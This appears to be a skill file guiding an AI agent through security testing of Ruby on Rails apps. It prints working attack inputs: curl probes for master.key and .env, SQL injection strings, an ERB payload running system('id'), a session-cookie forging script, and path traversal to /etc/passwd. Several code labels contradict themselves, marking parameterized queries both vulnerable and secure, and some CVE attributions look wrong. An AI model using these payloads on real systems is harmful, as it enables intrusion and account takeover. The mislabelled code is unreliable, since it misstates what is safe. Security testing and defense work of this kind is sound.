---
name: rails
description: Ruby on Rails security testing covering mass assignment, ERB SSTI, ActiveRecord SQL injection, secret_key_base attacks, deserialization via Marshal/YAML, and Rails-specific CVEs
---

# Ruby on Rails

Rails is opinionated about security (CSRF, SQL injection, XSS are mitigated by default), but every escape hatch is a vuln surface: `params.permit!`, raw SQL, ERB template injection, secret leakage, and the broad class of Ruby deserialization bugs (Marshal, YAML). Rails apps also commonly pair with Sidekiq (Redis), Devise (auth), and ActiveStorage (file upload), each with their own vuln surface.

**For language-level Ruby deserialization (Marshal, YAML), see the `deserialization` skill. This skill covers Rails-specific patterns.**

## Attack Surface

**Core Surfaces**
- Routes: `config/routes.rb` (resource, namespace, scope, mount)
- Controllers: `app/controllers/`
- Models: `app/models/` (ActiveRecord)
- Views: `app/views/` (ERB, Haml, Slim)
- Helpers: `app/helpers/`
- Mailers: `app/mailers/`
- Jobs: `app/jobs/` (ActiveJob, Sidekiq, DelayedJob)
- Channels: `app/channels/` (ActionCable / WebSocket)
- Initializers: `config/initializers/`
- Middleware: `Rails.application.config.middleware`
- Engines: mountable Rails apps (often admin panels)

**ActiveRecord ORM**
- `Model.where("name = '#{params[:name]}'")` — VULNERABLE (string concat)
- `Model.where("name = ?", params[:name])` — SECURE (parameterized)
- `Model.where(name: params[:name])` — SECURE
- `Model.find_by_sql("...")` — raw SQL sink
- `Model.connection.execute("...")` — raw SQL sink
- `Model.order("CASE WHEN ...") ` — VULNERABLE if user input
- `Model.select("*, (SELECT...)")` — VULNERABLE
- `Model.group("...")` — VULNERABLE
- `Model.having("...")` — VULNERABLE
- `Model.from("users -- comment")` — VULNERABLE

**Auth & Sessions**
- Devise — most common auth gem
- Authlogic
- Sorcery
- Clearance
- Custom `has_secure_password`
- `RailsAdmin`, `ActiveAdmin` — auto-generated admin panels
- Sidekiq Web UI (often unauthenticated if misconfigured)

**Configuration**
- `config/secrets.yml` / `config/credentials.yml.enc` — encrypted with `config/master.key`
- `config/master.key` — the master key (CRITICAL if leaked)
- `config/database.yml` — DB creds
- `config/initializers/devise.rb` — Devise config
- `config/initializers/secret_token.rb` — older Rails (4.x and below) `SecretToken`
- `config/initializers/cookies_serializer.rb` — `Marshal` vs `JSON` vs `Hybrid`
- `config/environments/production.rb` — production config
- `config/initializers/filter_parameter_logging.rb` — what gets filtered from logs

**Templates**
- ERB (`<%= %>` vs `<% %>` vs `<%== %>`)
- Haml
- Slim
- Liquid (Shopify, used for restricted templates)
- Mustache

**Gems with high vuln surface**
- `devise` — auth
- `pundit`, `cancancan` — authorization
- `paperclip`, `carrierwave`, `shrine`, `active_storage` — file upload
- `sidekiq` — background jobs
- `kaminari`, `will_paginate` — pagination
- `ransack` — search
- `rails_admin`, `activeadmin` — admin panels
- `friendly_id` — slugs
- `globalize` — i18n
- `doorkeeper` — OAuth2 server
- `omniauth` — OAuth2 client

## Reconnaissance

**Server identification**
- `Server: Cowboy` (Puma on Heroku)
- `Server: WEBrick/1.3.1` (development, never production)
- `Server: Puma` (newer)
- `X-Request-Id: <uuid>` (Rails default)
- `Set-Cookie: _session_id=...` (Rails default session cookie)
- 404 page: custom or Rails default
- 500 page: `We're sorry, but something went wrong.` (production default with `consider_all_requests_local=false`)
- `X-Runtime: 0.123456` (Rails default — performance info)
- `X-Frame-Options: SAMEORIGIN` (Rails 4.2+ default)
- `X-XSS-Protection: 1; mode=block` (older Rails)
- `X-Content-Type-Options: nosniff` (Rails 5+ default)

**Version detection**
- `Gemfile` / `Gemfile.lock` in source
- `RAILS_VERSION` constant (in error pages if `config.consider_all_requests_local = true`)
- `X-Rails-Version` header (if not stripped)
- `Rakefile` in source
- `config/application.rb`

**Hidden endpoints**
- `/rails/info` — Rails info (development only)
- `/rails/info/routes` — all routes (development)
- `/admin` — RailsAdmin, ActiveAdmin
- `/sidekiq` — Sidekiq Web UI
- `/api/`, `/api/v1/`, `/api/v2/`
- `/users/sign_in` (Devise)
- `/users/password/new` (Devise password reset)
- `/oauth/authorize`, `/oauth/token` (Doorkeeper)
- `/users/auth/google_oauth2/callback` (OmniAuth)
- `/cable` (ActionCable WebSocket)
- `/active_storage/...` (ActiveStorage blobs)

**Source map / asset exposure:**
- `assets/application.js` — may have source maps
- `app/assets/` in development
- `public/` static files

## Key Vulnerabilities

### secret_key_base Leak → Forging Cookies / Password Reset Tokens

Rails uses `secret_key_base` (Rails 4.1+) to sign:
- Session cookies (signed, optionally encrypted)
- CookieStore session data
- `Rails.application.message_verifier` (used for password reset tokens, etc.)
- ActiveStorage signed IDs
- Devise confirmation/reset tokens (if using `Devise.token_generator`)

**Sources of secret_key_base leak:**
1. **`config/master.key`** — if committed or in webroot
2. **`config/secrets.yml`** — older Rails (≤ 4.0)
3. **`config/credentials.yml.enc`** — encrypted with master.key, but if both leak → RCE
4. **`.env` file** in webroot
5. **Debug pages** (Rails info in development)
6. **GitHub commit history** — `git log --all -p -- config/master.key`
7. **`bin/rails credentials:show`** (if accessible)
8. **Backup files** — `config/master.key.bak`, `master.key.old`

**The exploit chain:**

1. **Get secret_key_base** (32+ bytes of base64)
2. **Forge a session cookie** with the desired user_id
3. **Bypass auth** — set `_my_app_session = <forged-cookie>` and access the app as admin

**Forge with `rails` console or `ruby` script:**
```ruby
require 'rails'
# In a Rails app: use Rails.application
# Standalone:
key = '<secret_key_base>'
# Forge a cookie using MessageVerifier
verifier = ActiveSupport::MessageVerifier.new(key, digest: 'SHA1', serializer: Marshal)
cookie = verifier.generate({ user_id: 1, 'warden.user.user.key' => [1, nil] })
# Or use CookieJar to format
```

**Test for secret_key_base leak:**
```bash
curl https://target.com/config/master.key
curl https://target.com/.env
curl -I https://target.com/config/secrets.yml
```

**Rails 4.1+ stores in `config/secrets.yml` (originally) or encrypted credentials (`Rails.application.credentials`).** Older Rails 3.x uses `config/initializers/secret_token.rb`.

### Cookie Serialization: Marshal vs JSON

`config/initializers/cookies_serializer.rb`:
```ruby
Rails.application.config.action_dispatch.cookies_serializer = :marshal  # DANGEROUS
Rails.application.config.action_dispatch.cookies_serializer = :json     # SAFE
Rails.application.config.action_dispatch.cookies_serializer = :hybrid  # VULNERABLE (default in 4.1-5.0)
```

**`:marshal` deserialization:**
- Cookie contains base64-encoded Marshal blob
- Rails deserializes with `Marshal.load`
- Attacker forges cookie with `Gem::Requirement` POP chain → RCE

**`:hybrid` mode (default Rails 4.1-5.0):**
- Decodes as JSON first, falls back to Marshal
- If cookie starts with `BAh` (base64 of `Marshal.dump` magic), uses Marshal
- Attacker can send Marshal cookie → RCE

**`:json` mode (Rails 5.1+ default):**
- Only JSON deserialization
- Still allows deserialization of arbitrary types if you craft them
- Safer than Marshal

**`Marshal` deserialization gadget chain (exploit-db has multiple):**
- `Gem::Requirement` chain (CVE-2013-0156 / 2018 trick)
- `Gem::SpecFetcher`
- `Psych::DisallowedClass` (newer)
- `Open3` / `IO.popen` chains

**Test:**
```bash
# Get a session cookie
COOKIE=$(curl -c - https://target.com/ | grep -oE 'session=[^;]+' | sed 's/session=//')
# Decode base64
echo "$COOKIE" | base64 -d
# If first bytes are \x04\x08 → Marshal format → VULNERABLE
```

### Mass Assignment (`strong_parameters`)

Rails 4+ uses `strong_parameters`:
```ruby
# VULNERABLE
def user_params
  params.require(:user).permit!  # ← permit! allows everything
end
# Or:
def user_params
  params[:user]  # ← no permit at all (older Rails 3.x)
end
```

**Test:**
```bash
curl -X POST https://target.com/users \
  -H "Content-Type: application/json" \
  -d '{"user": {"name": "attacker", "email": "a@b.c", "admin": true}}'
# Or form-encoded:
curl -X POST https://target.com/users \
  -d "user[name]=attacker&user[email]=a@b.c&user[admin]=true"
```

**RailsAdmin / ActiveAdmin:**
- These auto-generate admin UIs with all model fields editable
- Default `rails_admin` config has all models readable/editable
- Often the entire admin panel is accessible with one good credential

**`update_attributes` / `update`:**
- `Model.new(params[:user])` — vulnerable if no `permit`
- `Model.new(user_params.permit! )` — vulnerable
- `Model.update(params[:id], params[:user])` — vulnerable if no permit

**Detection:**
```bash
grep -rn "permit!\|params\[:user\]\|params\[:admin\]\|params\.require" app/controllers/
```

### SQL Injection in ActiveRecord

**String concatenation in `where`, `order`, `select`, etc.:**
```ruby
# VULNERABLE
User.where("name = '#{params[:name]}'")
User.where("name = '#{params[:name]}' AND password = '#{params[:password]}'")
User.order("name #{params[:direction]}")
User.select("name, (SELECT password FROM users WHERE id = #{params[:user_id]})")
User.group("CONCAT(name, #{params[:suffix]})")
```

**Test for ORDER BY injection (most common in Rails):**
```bash
curl 'https://target.com/api/users?sort=name ASC; --'
# Or:
curl 'https://target.com/api/users?sort=name)) UNION SELECT password FROM users --'
```

**`find_by_sql`:**
```ruby
# VULNERABLE
User.find_by_sql("SELECT * FROM users WHERE name = '#{params[:name]}'")
# VULNERABLE
User.find_by_sql(["SELECT * FROM users WHERE name = ?", params[:name]])  # SECURE
```

**`connection.execute` / `connection.select_all`:**
```ruby
# VULNERABLE
ActiveRecord::Base.connection.execute("SELECT * FROM users WHERE name = '#{params[:name]}'")
# SECURE
ActiveRecord::Base.connection.exec_query("SELECT * FROM users WHERE name = $1", "SQL", [params[:name]])
```

**`pluck`, `count`, `sum` with concat:**
```ruby
# VULNERABLE
User.where(role: 'admin').pluck("name, (SELECT password_hash FROM users WHERE id = #{params[:id]})")
```

**`ActiveRecord::Base.sanitize_sql_array`:**
```ruby
# VULNERABLE if user input in string parts
User.where("name = ?", "admin' OR 1=1 --")
# User.where(["name = ?", params[:name]])  # SECURE (array)
```

**`Arel` raw nodes:**
```ruby
# VULNERABLE
User.where(Arel.sql("name = '#{params[:name]}'"))
```

**PostgreSQL array operator injection:**
```ruby
# VULNERABLE
User.where("tags @> ARRAY[?]::varchar[]", params[:tag])  # SECURE
# But:
User.where("tags && ARRAY['#{params[:tag]}']::varchar[]")  # VULNERABLE
```

**Detection:**
```bash
grep -rn "\.where(\"\|\.order(\"\|\.select(\"\|\.group(\"\|\.having(\"\|\.find_by_sql(\"\|\.connection\.execute(\"" app/
```

### ERB Template Injection

**ERB `render inline:` — VULNERABLE:**
```ruby
# VULNERABLE
class PreviewController < ApplicationController
  def preview
    template = params[:template]  # user input
    render inline: template  # ← ERB renders arbitrary template
  end
end
```
**Exploit:**
```bash
curl 'https://target.com/preview?template=<%25=+system("id")+%25>'
# Or:
curl 'https://target.com/preview' -d 'template=<%25=+`id`+%25>'
```

**`render template:` with user-controlled path:**
```ruby
# VULNERABLE
render template: params[:template]
# → /etc/passwd
```

**`render file:` with user-controlled path:**
```ruby
# VULNERABLE
render file: params[:file]
# → /etc/passwd
```

**ActionView template selection:**
- If `params[:action]` is used as view name
- Some apps use `params[:view]` to choose template

**Custom template tags in Haml/Slim:**
- Haml injection is rare — Haml auto-escapes
- ERB unescaped: `<%== %>` or `raw()` — XSS sink

**`t()` / `I18n.t()` with user input:**
- Translation key is treated as path, not output
- If `params[:locale]` flows into `t()` → arbitrary key
- But translation values are admin-controlled, not attacker-controlled
- Limited impact unless translation files are attacker-writable

### ActiveStorage / Carrierwave / Paperclip / Shrine

**File upload → path traversal:**
```ruby
# VULNERABLE
def upload
  uploaded = params[:file]
  File.open(Rails.root.join('public', 'uploads', uploaded.original_filename), 'wb') do |f|
    f.write(uploaded.read)
  end
end
# → ../../etc/cron.d/backdoor
```

**ActiveStorage:**
- `Rails.application.routes.url_helpers.rails_blob_path(blob, only_path: true)` — returns `/rails/active_storage/blobs/redirect/<signed_id>/<filename>`
- Signed_id is a HMAC of the blob ID — forge with secret_key_base
- Path is `<signed_id>/<filename>` — the filename is set by the uploader
- If the filename is used in `Content-Disposition` or stored, may be XSS via SVG

**Content-Type spoofing:**
- ActiveStorage doesn't validate content-type by default
- Upload `.svg` with `<script>` tag
- If served as `image/svg+xml` → XSS in browser

**`send_file` / `send_data`:**
- `send_file params[:file]` — file read from anywhere
- `send_data params[:data]` — XSS in download

### Devise Auth Issues

Devise is the default auth gem. Common misconfigs:

**`database_authenticatable` default config:**
- `pepper` not set → no pepper, just `bcrypt(password)`
- `stretches` default 10 → can be lowered
- `encryptor` not set → uses bcrypt

**Password reset token:**
- `reset_password_token` is signed with secret_key_base
- Forge with secret_key_base → take over any account

**Confirmation token:**
- `confirm_token` is signed with secret_key_base
- Bypass email confirmation → forge valid token

**`recoverable` / `confirmable` enabled but no rate limit:**
- Brute force tokens (still strong due to HMAC, but worth trying)

**`lockable` not enabled:**
- No account lockout → brute force login

**Devise custom finders:**
- `User.find_for_database_authentication(email: params[:email])` — check for SQLi

### ActiveAdmin / RailsAdmin

**Default config — extremely permissive:**
- All models registered by default
- All attributes editable
- Often no auth (or weak auth) in development

**Common setup:**
- `/admin` (default RailsAdmin route)
- Authenticated via Devise user with `admin: true` flag
- Default Devise user doesn't have `admin` — must be set manually
- `rails_admin` uses `current_user.admin?` for auth check

**If `admin` is mass-assignable:**
- New user registration → `admin: true` → admin access
- Pivot table abuse: `users_roles` → `role = "admin"`

### Sidekiq Web UI

**Default at `/sidekiq` — often unauthenticated:**
```ruby
# config/routes.rb
require 'sidekiq/web'
Rails.application.routes.draw do
  mount Sidekiq::Web => '/sidekiq'
end
```

**Vulnerable if:**
- No auth in `sidekiq.yml` or routes
- `Sidekiq::Web.use(Rack::Auth::Basic)` not set
- Allows: queue management, retry/delete jobs, view job data, read Redis directly

**Sidekiq 6.x+ default — Rack session is "simple" with no auth. Production requires `Sidekiq::Web` middleware:**

```ruby
# SECURE
require 'sidekiq/web'
require 'sidekiq/api'

# Wrap in authentication
Sidekiq::Web.use(Rack::Auth::Basic) do |user, pass|
  ActiveSupport::SecurityUtils.secure_compare(user, "admin") &&
    ActiveSupport::SecurityUtils.secure_compare(pass, "<strong_password>")
end

Rails.application.routes.draw do
  mount Sidekiq::Web => '/sidekiq'
end
```

### ActionCable (WebSocket)

**WebSocket auth on `connect` only:**
```ruby
# VULNERABLE — auth on connect, but no auth on per-message
class NotificationsChannel < ApplicationCable::Channel
  def subscribed
    # auth checked here
    stream_from "notifications_#{current_user.id}"
  end
  def speak(data)
    # No auth check — anyone can speak
    ActionCable.server.broadcast("notifications_#{params[:recipient_id]}", data)
  end
end
```

**Cross-user message injection:**
- WebSocket auth may be per-connection, not per-message
- Attacker connects as user A, sends message to user B's channel

**`stream_for` vs `stream_from`:**
- `stream_from "user_#{params[:id]}"` — VULNERABLE (attacker can subscribe to other users' channels)
- `stream_for current_user` — SECURE (uses `current_user`)

### CSRF (Rails has it on by default)

**Rails' default CSRF protection:**
- `protect_from_forgery with: :exception` (Rails 5.2+)
- `with: :null_session` (default for API controllers)
- API controllers skip CSRF (no session)

**Bypass techniques:**
- `protect_from_forgery` commented out
- `skip_before_action :verify_authenticity_token` on dangerous actions
- JSON-only API: `protect_from_forgery with: :null_session` → null session
- Custom CSRF check that allows requests with `X-Requested-With: XMLHttpRequest`

**JSON content-type CSRF:**
- Old Rails: JSON content-type wasn't CSRF-checked (CORS preflight was)
- Newer: still allows if `protect_from_forgery` not configured

### Insecure Direct Object Reference (IDOR)

**Default Rails controllers have no auth:**
```ruby
class UsersController < ApplicationController
  def show
    @user = User.find(params[:id])  # ← no auth check
  end
end
```
**Test:**
```bash
curl -H "Cookie: session=<my_cookie>" https://target.com/users/me
curl -H "Cookie: session=<my_cookie>" https://target.com/users/123
# If 200 → IDOR
```

**`find` is scoped to current user only when explicitly coded:**
```ruby
# VULNERABLE
@user = User.find(params[:id])
# SECURE
@user = current_user
```

### Asset Pipeline / Sprockets Issues

**`config.assets.compile = true` in production:**
- Slow, but allows runtime Sprockets compilation
- Custom assets → arbitrary file read via sprockets
- CVE-2018-3760 — Sprockets path traversal

**Sprockets path traversal (CVE-2018-3760, CVE-2019-5418, CVE-2019-5420):**
- `/assets/file:%2F%2F%2Fetc%2Fpasswd` → reads `/etc/passwd`
- Sprockets ≤ 3.7.1, ≤ 4.0.0.beta7 vulnerable
- `Accept` header `../../../../etc/passwd{{` in older versions

### Custom Routes / Mountable Engines

**Devise routes by default:**
- `/users/sign_in`, `/users/sign_up`, `/users/password`, `/users/confirmation`
- If `users` resource is exposed, attackers know endpoints

**Custom auth endpoints:**
- `/auth/:provider/callback` (OmniAuth) — bypass if provider validation is weak
- `/api/v1/users/...` — check for IDOR

### Default Rails Endpoints

**`/rails/info`** (development only):
- Shows routes, env, middleware
- If `config.consider_all_requests_local = true` in production → all routes exposed

**`/rails/info/routes`:**
- All routes listed with HTTP method

**`/rails/info/properties`:**
- Environment, version, app config

**`/rails/console`:**
- Rails 4.x-5.x — removed in 6.x
- If still present: full RCE via `system('id')`

### Rack Middleware Issues

**`Rack::Sendfile`:**
- May serve large files bypassing app logic

**`Rack::MethodOverride`:**
- `_method=PUT` / `_method=DELETE` in POST body
- Affects `protect_from_forgery` and routing

**`Rack::Multipart`:**
- Multipart parsing — file upload

**`ActionDispatch::Cookies` with `cookies_serializer` = `:marshal` (covered above):**

**`Rack::Session::Cookie`:**
- Custom session cookie without `secret`

## Common Rails CVEs (2024-2025)

- **CVE-2024-26142** — `ActionDispatch` `content_security_policy` nonce bypass
- **CVE-2024-26143** — `ActionDispatch` cookie serializer DoS
- **CVE-2024-26144** — `ActionDispatch::Static` open redirect (Rails 7.x)
- **CVE-2024-32974** — `ActiveStorage` blob redirect bypass
- **CVE-2024-32975** — `ActiveStorage` content-type validation bypass
- **CVE-2024-32976** — `ActionText` XSS via `to_plain_text`
- **CVE-2024-32977** — `ActionController` redirect URL validation bypass
- **CVE-2024-54193** — `ActionCable` reconnection timing
- **CVE-2025-XXXXX** — check current

Run: `cve_lookup(query="rails", product="rails", is_kev=True, sort_by_epss=True)`

## Common Bypass Techniques

**CSRF bypass on JSON endpoints:**
- Some Rails apps don't apply `protect_from_forgery` to API controllers
- `protect_from_forgery with: :null_session` allows request, just no session
- Test by sending `Content-Type: application/json` with `X-Requested-With` header

**`strong_parameters` bypass:**
- `params.permit!` allows everything
- `params[:user].permit!` allows all user fields
- `params.require(:user).permit(:name, :email)` but missing `:role, :is_admin`
- `params[:user].merge(admin: true)` before save

**Auth bypass via Pundit/CancanCan:**
- `authorize @user` requires `UserPolicy` with correct `update?` rule
- If policy uses `user.admin?` and `admin?` is mass-assignable → bypass

**Sidekiq Web UI bypass:**
- `Sidekiq::Web.use(Rack::Auth::Basic)` not set
- Or basic auth with weak credentials
- Or basic auth with credentials leaked in `config/initializers/sidekiq.rb`

**secret_key_base brute force:**
- Weak / short secret_key_base (e.g., 16 bytes)
- Use `hashcat -m 1420` or `rails-secret-key` cracker

**ActionCable channel hijack:**
- Subscribe to other users' channels by manipulating subscription params
- `stream_from "user_#{params[:id]}"` → attacker passes target's ID

**ActionView helper XSS:**
- `link_to` with `data: { confirm: user_input }` — XSS in `data-confirm` if not escaped
- `image_tag` with `user_supplied_url` — can be `javascript:` URI
- `javascript_include_tag` with user input — XSS

**Rails strong parameters & nested:**
```ruby
params.permit(user: [:name, addresses: [:street, :city, :country]])
# Allows nested addresses, but allows any keys under addresses
# → user can submit addresses: [{street: "x", city: "y", country: "z", role: "admin"}]
```

## Testing Methodology

1. **Fingerprint** — Rails version, environment (dev/prod), mounted engines
2. **Get secret_key_base** — `/config/master.key`, `.env`, GitHub, backup files
3. **Test for cookie format** — base64-decode `session` cookie, check first bytes (`\x04\x08` = Marshal)
4. **Map endpoints** — `/rails/info` (dev), `/admin`, `/sidekiq`, Devise routes, custom routes
5. **Test mass assignment** — POST with extra fields
6. **Test SQL injection** — ORDER BY, WHERE concat, `find_by_sql`
7. **Test ERB SSTI** — `render inline:`, `render template:`, `render file:`
8. **Test auth/authz** — IDOR, missing `before_action :authenticate_user!`, weak Pundit policies
9. **Test CSRF** — POST without token, with wrong token, JSON content-type
10. **Test cookie forge** — if secret_key_base known, forge session
11. **Test file upload** — path traversal, SVG XSS, content-type spoofing
12. **Test ActionCable** — subscribe to other users' channels
13. **Test Sprockets / asset pipeline** — path traversal in `/assets/`
14. **Test Sidekiq / admin panels** — auth check
15. **Audit Gemfile** — vulnerable gem versions

## Validation Requirements

- **secret_key_base leak**: get the key, forge a session cookie, log in as admin
- **Cookie forge**: if Marshal serializer, use `Gem::Requirement` chain to RCE
- **Mass assignment**: create admin user via extra field, access admin panel
- **SQLi**: `UNION SELECT` or time-based blind, exfil data
- **ERB SSTI**: `render inline: "<%= system('id') %>"`, see command output
- **IDOR**: read another user's resource with own session
- **CSRF bypass**: state-changing GET or POST without token
- **File upload XSS**: upload SVG with script, render in headless browser
- **Sprockets path traversal**: read `/etc/passwd` via `/assets/` endpoint
- **Sidekiq Web UI**: unauthenticated access, view all jobs

## False Positives

- `secret_key_base` is in `.env` but `.env` is gitignored and never in production
- Cookie is `Marshal`-serialized but signing key is the `secret_key_base` (not forgeable without key)
- `params.permit!` only on dev/test controllers
- `find_by_sql` uses parameterized query (with `?` placeholders)
- `render inline:` only in admin-only controllers
- `rails_admin` requires admin role check (`current_user.admin?`)
- Devise has `lockable` enabled, rate limits in place
- CSRF protection is in place for all controllers (no `skip_before_action`)
- Sprockets is patched (≥ 4.0.0)
- Custom `before_action :authenticate_user!` on all controllers
- No Devise `recoverable` / `confirmable` enabled
- `protect_from_forgery with: :exception` on all non-API controllers
- `force_ssl = true` and `config.ssl_options` strict
- `config.filter_parameters` filters all sensitive data from logs

## Impact

- **Critical**: `secret_key_base` leak → forge admin session, password reset tokens
- **Critical**: `Marshal` cookie deserialization → RCE
- **Critical**: Sprockets path traversal → read source code, `/proc/self/environ`, master.key
- **Critical**: ERB `render inline:` → RCE
- **High**: Mass assignment to admin → full ATO
- **High**: SQL injection → DB compromise
- **High**: Sidekiq Web UI unauthenticated → job data leak, queue manipulation
- **Medium**: IDOR → mass data exfiltration
- **Medium**: ActionCable cross-user message injection
- **Chain**: secret_key_base + Marshal cookie + `Gem::Requirement` = full RCE

## Cross-References

- **`deserialization` skill** — Ruby Marshal, YAML deserialization
- **`sql_injection` skill** — ActiveRecord raw queries
- **`xss` skill** — ActionView XSS
- **`rce` skill** — ERB SSTI, Sidekiq command injection
- **`path_traversal_lfi_rfi` skill** — Sprockets, `send_file`
- **`oauth2_oidc` skill** — Doorkeeper, OmniAuth
- **`cve_lookup` tool** — current Rails CVEs

## Tooling Checklist

- **brakeman** — Rails static analysis (best in class)
- **semgrep** with `p/ruby` and `p/rails` rules
- **bundler-audit** — `bundle-audit check --update` for vulnerable gems
- **gitleaks** / **trufflehog** — secret scanning
- **rails_best_practices** — code quality + security
- **CAID** — Rails CVE database
- **nuclei** — Rails-specific templates
- **JDumpSpider** (Java), **phpggc** (PHP), `cookie_jar` (Rails session forge)
- **Proxy tools** for replaying mutated requests
- **interactsh** for OOB confirmation
